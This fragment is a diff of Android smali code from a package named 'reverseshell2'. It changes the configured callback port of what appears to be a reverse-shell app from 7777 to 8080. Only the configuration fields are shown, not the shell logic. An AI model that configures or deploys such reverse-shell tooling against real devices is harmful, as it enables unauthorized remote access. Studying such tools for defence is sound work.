@@ -21,7 +21,7 @@
     sput-object v0, Lcom/example/reverseshell2/config;->IP:Ljava/lang/String;
 
     .line 5
-    const-string v0, "7777"
+    const-string v0, "8080"
 
     sput-object v0, Lcom/example/reverseshell2/config;->port:Ljava/lang/String;
 
